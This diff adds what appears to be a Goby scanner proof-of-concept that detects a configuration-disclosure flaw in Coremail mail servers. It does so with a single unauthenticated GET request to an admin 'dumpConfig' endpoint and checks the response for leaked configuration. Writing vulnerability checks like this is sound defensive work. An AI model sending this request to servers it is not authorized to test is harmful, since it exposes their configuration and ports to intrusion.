@@ -1,0 +1,53 @@
+{
+      "Name": "Coremail configuration information disclosure",
+      "Level": "0",
+      "Tags": [
+            "Disclosure of Sensitive Information"
+      ],
+      "GobyQuery": "app=\"Coremail\"",
+      "Description": "There is a configuration information leakage vulnerability in an interface of COREMAIL, including port, configuration information, etc",
+      "Product": "Coremail",
+      "Homepage": "https://www.coremail.cn/",
+      "Author": "PeiQi",
+      "Impact": "<p>There is a configuration information leakage vulnerability in an interface of COREMAIL, including port, configuration information, etc<br></p>",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/mailsms/s?func=ADMIN:appState&dumpConfig=/",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "configHome",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-14 20:51:04",
+      "GobyVersion": "1.8.258"
+}
